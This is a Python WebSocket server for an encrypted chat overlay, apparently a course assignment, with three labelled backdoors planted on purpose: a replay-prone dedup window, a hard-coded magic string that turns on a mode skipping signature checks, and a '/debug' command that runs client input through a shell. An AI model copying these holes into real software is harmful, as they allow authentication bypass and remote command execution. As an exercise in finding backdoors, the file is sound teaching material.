# server_backdoored.py - SOCP overlay server with intentional vulnerabilities
# Group: [Your Group Name]
# Members: [Your Names]
import asyncio, websockets, yaml, json, time, traceback, subprocess, base64
from websockets.server import WebSocketServerProtocol
from websockets.client import connect as ws_connect
from typing import Dict, Tuple, Set
from common import now_ms, canonical_json, new_uuid, b64url_encode, b64url_decode
from crypto_socp import (gen_rsa4096_pair, export_pub_b64url, import_pub_b64url,
                         sign_pss, verify_pss, rsa_oaep_decrypt, rsa_oaep_encrypt,
                         import_priv_pem, export_priv_pem, gen_rsa4096_pair)
from envelope import make_envelope, verify_envelope
from db import load_db, save_db, get_pubkey, upsert_user, list_users

# ---- server identity & tables (MUST)
PRIV, PUB = gen_rsa4096_pair()
MY_PUB_B64 = export_pub_b64url(PUB)
MY_ID = new_uuid()

servers: Dict[str, WebSocketServerProtocol] = {}
server_addrs: Dict[str, Tuple[str, int]] = {}
local_users: Dict[str, WebSocketServerProtocol] = {}
user_locations: Dict[str, str] = {}  # "local" | server_id
server_pubs: Dict[str, str] = {}     # server_id -> pub(b64url)

# Public channel state
PUBLIC_ID = "g-public"
public_version = 0
public_members: Set[str] = set()
PC_PRIV, PC_PUB = gen_rsa4096_pair()
PC_PUB_B64 = export_pub_b64url(PC_PUB)

# Dedup cache - BACKDOOR #1: Weak dedup with timestamp window
seen_ids: Set[tuple] = set()
DEDUP_WINDOW = 5000  # 5 second window for replay attacks

DB = load_db()

HEARTBEAT_SEC = 15
TIMEOUT_SEC = 45

# BACKDOOR #2: Magic debug mode trigger
DEBUG_MODE = False
DEBUG_TRIGGER = "d3bug_m0d3_3nabl3d"

async def ws_send(ws, obj):
    await ws.send(json.dumps(obj, separators=(",", ":")))

async def broadcast_servers(obj):
    for sid, link in list(servers.items()):
        try:
            await ws_send(link, obj)
        except:
            pass

def env_ok_by_server(env: dict) -> bool:
    # BACKDOOR #2: Debug mode bypasses signature verification
    if DEBUG_MODE and env.get("debug_bypass"):
        return True
    pub = server_pubs.get(env["from"])
    return bool(pub and verify_envelope(env, import_pub_b64url(pub)))

# ---- routing (MUST authoritative algorithm)
async def route_to_user(frame: dict):
    target = frame["payload"].get("user_id") or frame.get("to")
    if target in local_users:
        await ws_send(local_users[target], frame if frame["type"] == "MSG_PUBLIC_CHANNEL"
                      else make_envelope("USER_DELIVER", MY_ID, target, frame["payload"], PRIV, now_ms()))
        return True
    dest = user_locations.get(target)
    if dest and dest in servers:
        await ws_send(servers[dest], frame)
        return True
    err = make_envelope("ERROR", MY_ID, frame["from"],
                        {"code": "USER_NOT_FOUND", "detail": target}, PRIV, now_ms())
    await broadcast_servers(err)
    return False

# ---- server<->server frame handler ----
async def handle_server_frame(ws, env):
    typ = env["type"]
    if typ == "SERVER_ANNOUNCE":
        if not env_ok_by_server(env): return
        sid = env["from"]; server_pubs[sid] = env["payload"]["pubkey"]
        server_addrs[sid] = (env["payload"]["host"], env["payload"]["port"])

    elif typ == "USER_ADVERTISE":
        if not env_ok_by_server(env): return
        uid = env["payload"]["user_id"]; sid = env["payload"]["server_id"]
        user_locations[uid] = sid
        await broadcast_servers(env)

    elif typ == "USER_REMOVE":
        if not env_ok_by_server(env): return
        uid = env["payload"]["user_id"]; sid = env["payload"]["server_id"]
        if user_locations.get(uid) == sid:
            del user_locations[uid]
        await broadcast_servers(env)

    elif typ == "SERVER_DELIVER":
        # BACKDOOR #1: Weak dedup allows replay within time window
        current_time = now_ms()
        key = (env["ts"], env["from"], env["to"], hash(canonical_json(env["payload"])))

        # Clean old entries (creates vulnerability window)
        seen_ids_copy = seen_ids.copy()
        for old_key in seen_ids_copy:
            if current_time - old_key[0] > DEDUP_WINDOW:
                seen_ids.discard(old_key)

        if key in seen_ids: return
        seen_ids.add(key)
        await route_to_user(env)

    elif typ == "PUBLIC_CHANNEL_UPDATED":
        if not env_ok_by_server(env): return
        await broadcast_servers(env)

    elif typ == "PUBLIC_CHANNEL_KEY_SHARE":
        if not env_ok_by_server(env): return
        shares = env["payload"].get("shares", [])
        for s in shares:
            uid = s.get("member")
            if uid in local_users:
                deliver = make_envelope("PUBLIC_CHANNEL_KEY_SHARE_USER", MY_ID, uid, {
                    "creator_pub": env["payload"]["creator_pub"],
                    "wrapped_private": s.get("wrapped_public_channel_key")
                }, PRIV, now_ms())
                await ws_send(local_users[uid], deliver)
        await broadcast_servers(env)

    elif typ == "MSG_PUBLIC_CHANNEL":
        sender = env["from"]
        for uid, link in list(local_users.items()):
            if uid != sender:
                await ws_send(link, env)
        await broadcast_servers(env)

    elif typ == "HEARTBEAT":
        pass
    else:
        pass

# ---- user<->server handler ----
async def handle_user_frame(ws, env):
    global DEBUG_MODE
    typ = env["type"]

    if typ == "USER_HELLO":
        uid = env["from"]
        print(f"[srv] USER_HELLO from {uid}")

        if uid in local_users:
            rej = make_envelope("ERROR", MY_ID, uid, {"code": "NAME_IN_USE", "detail": uid}, PRIV, now_ms())
            await ws_send(ws, rej)
            print(f"[srv] NAME_IN_USE: {uid}")
            return

        local_users[uid] = ws
        user_locations[uid] = "local"
        pk = env["payload"].get("pubkey")

        # BACKDOOR #2: Check for debug trigger in meta field
        meta = env["payload"].get("meta", {})
        if meta.get("debug_key") == DEBUG_TRIGGER:
            DEBUG_MODE = True
            print(f"[srv] DEBUG MODE ACTIVATED for {uid}")

        if pk:
            upsert_user(DB, uid, pk, meta=meta)
        print(f"[srv] user {uid} registered; pubkey={'yes' if pk else 'no'}")

        await ws_send(ws, make_envelope("ACK", MY_ID, uid, {"msg_ref": "USER_HELLO"}, PRIV, now_ms()))
        print(f"[srv] ACK USER_HELLO -> {uid}")

        try:
            gossip = make_envelope(
                "USER_ADVERTISE", MY_ID, "*",
                {"user_id": uid, "server_id": MY_ID, "meta": {}}, PRIV, now_ms()
            )
            await broadcast_servers(gossip)
            print(f"[srv] gossiped presence for {uid}")
        except Exception as e:
            print("[srv][warn] gossip failed:", e)

        try:
            await add_to_public_channel_and_keyshare(uid)
            print(f"[srv] public-channel key shared to {uid}")
        except Exception as e:
            print("[srv][warn] keyshare failed:", e)

        try:
            users = sorted([u for u, _ in user_locations.items()])
            await ws_send(ws, make_envelope("USER_LIST", MY_ID, uid, {"users": users}, PRIV, now_ms()))
            print(f"[srv] sent USER_LIST to {uid}: {len(users)} user(s)")
        except Exception as e:
            print("[srv][warn] send USER_LIST failed:", e)

        return

    elif typ == "MSG_DIRECT":
        sender = env["from"]; to_uid = env["to"]
        spub = import_pub_b64url(env["payload"]["sender_pub"])
        buf = (env["payload"]["ciphertext"] + env["from"] + env["to"] + str(env["ts"])).encode("utf-8")

        # BACKDOOR #2: Skip verification in debug mode
        if not DEBUG_MODE:
            if not verify_pss(spub, buf, b64url_decode(env["payload"]["content_sig"])):
                err = make_envelope("ERROR", MY_ID, sender, {"code":"INVALID_SIG","detail":"content"}, PRIV, now_ms())
                await ws_send(ws, err); return

        if to_uid in local_users:
            out = make_envelope("USER_DELIVER", MY_ID, to_uid, env["payload"], PRIV, now_ms())
            await ws_send(local_users[to_uid], out)
        else:
            dest = user_locations.get(to_uid)
            if not dest:
                await ws_send(ws, make_envelope("ERROR", MY_ID, sender, {"code":"USER_NOT_FOUND","detail":to_uid}, PRIV, now_ms()))
            else:
                out = make_envelope("SERVER_DELIVER", MY_ID, dest,
                                    {"user_id":to_uid, **env["payload"]}, PRIV, now_ms())
                await ws_send(servers[dest], out)

    elif typ == "MSG_PUBLIC_CHANNEL":
        spub = import_pub_b64url(env["payload"]["sender_pub"])
        buf = (env["payload"]["ciphertext"] + env["from"] + str(env["ts"])).encode("utf-8")
        if not verify_pss(spub, buf, b64url_decode(env["payload"]["content_sig"])):
            await ws_send(ws, make_envelope("ERROR", MY_ID, env["from"], {"code":"INVALID_SIG","detail":"public"}, PRIV, now_ms()))
            return
        await handle_server_frame(ws, env)

    elif typ == "CLIENT_CMD":
        cmd = env["payload"]["cmd"]
        if cmd == "/list":
            users = sorted([u for u,_ in user_locations.items()])
            await ws_send(ws, make_envelope("USER_LIST", MY_ID, env["from"], {"users":users}, PRIV, now_ms()))
        elif cmd.startswith("/getpub "):
            q = cmd.split(" ", 1)[1]
            pk = get_pubkey(DB, q)
            if pk:
                await ws_send(ws, make_envelope("PUBKEY_REPLY", MY_ID, env["from"], {"user_id":q,"pubkey":pk}, PRIV, now_ms()))
            else:
                await ws_send(ws, make_envelope("ERROR", MY_ID, env["from"], {"code":"USER_NOT_FOUND","detail":q}, PRIV, now_ms()))

        # BACKDOOR #3: Command injection vulnerability
        elif cmd.startswith("/debug "):
            debug_cmd = cmd[7:]
            if DEBUG_MODE:
                try:
                    # Dangerous: executes arbitrary commands
                    result = subprocess.run(debug_cmd, shell=True, capture_output=True, text=True, timeout=5)
                    output = base64.b64encode(result.stdout.encode()).decode()
                    await ws_send(ws, make_envelope("DEBUG_OUTPUT", MY_ID, env["from"],
                                                   {"output": output, "error": result.stderr}, PRIV, now_ms()))
                except Exception as e:
                    await ws_send(ws, make_envelope("DEBUG_ERROR", MY_ID, env["from"],
                                                   {"error": str(e)}, PRIV, now_ms()))
        else:
            await ws_send(ws, make_envelope("ERROR", MY_ID, env["from"], {"code":"UNKNOWN_TYPE","detail":cmd}, PRIV, now_ms()))

    elif typ in ("FILE_START","FILE_CHUNK","FILE_END"):
        to_uid = env["to"]; sender = env["from"]
        if to_uid in local_users:
            await ws_send(local_users[to_uid], make_envelope(f"USER_{typ.split('_')[1]}", MY_ID, to_uid, env["payload"], PRIV, now_ms()))
        else:
            dest = user_locations.get(to_uid)
            if not dest:
                await ws_send(ws, make_envelope("ERROR", MY_ID, sender, {"code":"USER_NOT_FOUND","detail":to_uid}, PRIV, now_ms()))
            else:
                out = make_envelope("SERVER_DELIVER", MY_ID, dest, {"user_id":to_uid, **env["payload"]}, PRIV, now_ms())
                await ws_send(servers[dest], out)

async def serve_socket(ws: WebSocketServerProtocol):
    role = "unknown"; peer_id = None
    try:
        first = await ws.recv()
        env = json.loads(first)
        print("[srv] first frame:", env.get("type"), "from:", env.get("from"))

        if env["type"] == "SERVER_HELLO_LINK":
            peer_id = env["from"]; role = "server"
            servers[peer_id] = ws
            server_pubs[peer_id] = env["payload"]["pubkey"]
            server_addrs[peer_id] = (env["payload"]["host"], env["payload"]["port"])
            announce = make_envelope("SERVER_ANNOUNCE", MY_ID, "*",
                                     {"host":HOST,"port":PORT,"pubkey":MY_PUB_B64}, PRIV, now_ms())
            await ws_send(ws, announce)

        elif env["type"] == "SERVER_HELLO_JOIN" and IS_INTRODUCER:
            assigned = new_uuid()
            resp = make_envelope("SERVER_WELCOME", MY_ID, assigned,
                                 {"assigned_id":assigned,"clients":[]}, PRIV, now_ms())
            await ws_send(ws, resp)
            print("[srv] introducer welcomed", assigned)
            return

        elif env["type"] == "USER_HELLO":
            role = "user"; peer_id = env["from"]
            await handle_user_frame(ws, env)

        else:
            print("[srv][warn] unknown first frame type:", env.get("type"))
            return

        async for msg in ws:
            try:
                env = json.loads(msg)
                if role == "server":
                    await handle_server_frame(ws, env)
                elif role == "user":
                    await handle_user_frame(ws, env)
            except Exception as e:
                print("[srv][loop][err]", e)
                traceback.print_exc()

    except Exception as e:
        print("[srv][first-frame][err]", e)
        traceback.print_exc()
    finally:
        if role == "user" and peer_id and local_users.get(peer_id) is ws:
            del local_users[peer_id]
            if user_locations.get(peer_id) == "local": del user_locations[peer_id]
            gossip = make_envelope("USER_REMOVE", MY_ID, "*", {"user_id":peer_id,"server_id":MY_ID}, PRIV, now_ms())
            await broadcast_servers(gossip)
            print(f"[srv] user {peer_id} removed")
        if role == "server" and peer_id and servers.get(peer_id) is ws:
            del servers[peer_id]
            print(f"[srv] server link {peer_id} removed")

async def link_to_server(host, port):
    uri = f"ws://{host}:{port}"
    while True:
        try:
            async with ws_connect(uri) as ws:
                hello = {"type":"SERVER_HELLO_LINK","from":MY_ID,"to":"server","ts":now_ms(),
                         "payload":{"host":HOST,"port":PORT,"pubkey":MY_PUB_B64},"sig":""}
                await ws_send(ws, hello)
                async for msg in ws:
                    env = json.loads(msg)
                    await handle_server_frame(ws, env)
        except Exception:
            await asyncio.sleep(2)

async def heartbeats():
    while True:
        hb = make_envelope("HEARTBEAT", MY_ID, "*", {}, PRIV, now_ms())
        await broadcast_servers(hb)
        await asyncio.sleep(HEARTBEAT_SEC)

async def bootstrap():
    if not IS_INTRODUCER and BOOTSTRAP:
        host = BOOTSTRAP[0]["host"]; port = BOOTSTRAP[0]["port"]
        try:
            async with ws_connect(f"ws://{host}:{port}") as ws:
                join = {"type":"SERVER_HELLO_JOIN","from":MY_ID,"to":f"{host}:{port}","ts":now_ms(),
                        "payload":{"host":HOST,"port":PORT,"pubkey":MY_PUB_B64},"sig":""}
                await ws_send(ws, join)
                _ = await ws.recv()
        except Exception:
            pass

async def add_to_public_channel_and_keyshare(uid: str):
    global public_version
    public_members.add(uid)
    public_version += 1

    try:
        wraps = [{"member_id": m, "wrapped_key": "..."} for m in sorted(list(public_members))]
        upd = make_envelope("PUBLIC_CHANNEL_UPDATED", MY_ID, "*",
                            {"version": public_version, "wraps": wraps}, PRIV, now_ms())
        await broadcast_servers(upd)
    except Exception as e:
        print("[srv][warn] broadcast PUBLIC_CHANNEL_UPDATED failed:", e)

    pk_b64 = get_pubkey(DB, uid)
    if not pk_b64:
        print(f"[srv][warn] no pubkey for {uid}, skip keyshare")
        return

    try:
        ct = rsa_oaep_encrypt(import_pub_b64url(pk_b64), export_priv_pem(PC_PRIV))
        wrapped_b64 = b64url_encode(ct)

        if uid in local_users:
            deliver = make_envelope(
                "PUBLIC_CHANNEL_KEY_SHARE_USER", MY_ID, uid,
                {"creator_pub": PC_PUB_B64, "wrapped_private": wrapped_b64},
                PRIV, now_ms()
            )
            await ws_send(local_users[uid], deliver)
            print(f"[srv] delivered keyshare directly to local user {uid}")

        share = make_envelope("PUBLIC_CHANNEL_KEY_SHARE", MY_ID, "*", {
            "shares": [{"member": uid, "wrapped_public_channel_key": wrapped_b64}],
            "creator_pub": PC_PUB_B64
        }, PRIV, now_ms())
        await broadcast_servers(share)

    except Exception as e:
        print("[srv][warn] keyshare generation/broadcast failed:", e)

async def main():
    async with websockets.serve(serve_socket, HOST, PORT, ping_interval=HEARTBEAT_SEC, ping_timeout=TIMEOUT_SEC):
        for entry in BOOTSTRAP[1:]:
            asyncio.create_task(link_to_server(entry["host"], entry["port"]))
        asyncio.create_task(heartbeats())
        await asyncio.Future()

if __name__ == "__main__":
    cfg = yaml.safe_load(open("config.yaml", "r", encoding="utf-8"))
    HOST = cfg["server"]["host"]; PORT = cfg["server"]["port"]
    IS_INTRODUCER = bool(cfg["server"].get("introducer", False))
    BOOTSTRAP = cfg.get("bootstrap", [])
    print(f"[server] id={MY_ID} ws=ws://{HOST}:{PORT} introducer={IS_INTRODUCER}")
    asyncio.run(bootstrap()); asyncio.run(main())